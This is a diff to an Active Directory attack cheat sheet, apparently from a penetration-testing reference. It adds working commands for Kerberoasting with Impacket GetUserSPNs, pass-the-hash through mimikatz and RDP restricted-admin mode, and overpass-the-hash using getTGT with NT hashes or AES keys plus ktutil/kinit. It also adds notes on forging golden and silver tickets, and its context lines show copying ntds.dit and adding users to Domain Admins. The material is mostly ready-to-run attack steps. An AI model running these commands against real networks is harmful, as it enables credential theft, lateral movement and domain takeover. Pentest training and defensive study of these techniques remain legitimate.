@@ -113,6 +113,8 @@ Invoke-NinjaCopy --path c:\windows\NTDS\ntds.dit --verbose --localdestination c:
 ```
 
 ### Golden Tickets
+Forge a TGT, require krbtgt key
+
 Mimikatz version
 ```powershell
 Get info - Mimikatz
@@ -140,6 +142,8 @@ kerberos_ticket_list
 ```
 
 ### Silver Tickets
+Forge a TGS, require machine accound password (key) from the KDC
+
 ### Trust Tickets
 
 
@@ -147,6 +151,9 @@ kerberos_ticket_list
 ```c
 https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/
 https://room362.com/post/2016/kerberoast-pt1/
+
+./GetUserSPNS.py -request lab.ropnop.com/thoffman:Summer2017
+(Impacket) Kerberoasting (ldap query, tgs in JTR format)
 ```
 
 ### Pass-the-Hash 
@@ -165,9 +172,26 @@ cme smb 10.2.0.2 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5deb
 
 or with psexec
 proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d
+
+or with the builtin Windows RDP and mimikatz
+sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:"mstsc.exe /restrictedadmin"
 ```
 
 ### OverPass-the-Hash (pass the key)
+Request a TGT with only the NT hash
+```
+Using impacket
+./getTGT.py -hashes :1a59bd44fe5bec39c44c8cd3524dee lab.ropnop.com
+chmod 600 tgwynn.ccache
+
+also with the AES Key if you have it 
+./getTGT.py -aesKey xxxxxxxxxxxxxxkeyaesxxxxxxxxxxxxxxxx lab.ropnop.com
+
+
+ktutil -k ~/mykeys add -p tgwynn@LAB.ROPNOP.COM -e arcfour-hma-md5 -w 1a59bd44fe5bec39c44c8cd3524dee --hex -V 5
+kinit -t ~/mykers tgwynn@LAB.ROPNOP.COM
+klist
+```
 
 ### Dangerous Built-in Groups Usage
 AdminSDHolder
@@ -228,7 +252,6 @@ net group "Domain Admins" hacker2 /add /domain
 ## Thanks to
  * [https://chryzsh.gitbooks.io/darthsidious/content/compromising-ad.html](https://chryzsh.gitbooks.io/darthsidious/content/compromising-ad.html)
  * [Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
- * [Road to DC](https://steemit.com/infosec/@austinhudson/road-to-dc-part-1)
  * [Finding Passwords in SYSVOL & Exploiting Group Policy Preferences](https://adsecurity.org/?p=2288)
  * [Golden ticket - Pentestlab](https://pentestlab.blog/2018/04/09/golden-ticket/)
  * [Getting the goods with CrackMapExec: Part 1, by byt3bl33d3r](https://byt3bl33d3r.github.io/getting-the-goods-with-crackmapexec-part-1.html)
@@ -240,3 +263,5 @@ net group "Domain Admins" hacker2 /add /domain
  * [Pen Testing Active Directory Environments - Part IV: Graph Fun](https://blog.varonis.com/pen-testing-active-directory-environments-part-iv-graph-fun/)
  * [Pen Testing Active Directory Environments - Part V: Admins and Graphs](https://blog.varonis.com/pen-testing-active-directory-v-admins-graphs/)
  * [Pen Testing Active Directory Environments - Part VI: The Final Case](https://blog.varonis.com/pen-testing-active-directory-part-vi-final-case/)
+ * [Passing the hash with native RDP client (mstsc.exe)](https://michael-eder.net/post/2018/native_rdp_pass_the_hash/)
+ *[Fun with LDAP, Kerberos (and MSRPC) in AD Environments](https://speakerdeck.com/ropnop/fun-with-ldap-kerberos-and-msrpc-in-ad-environments)
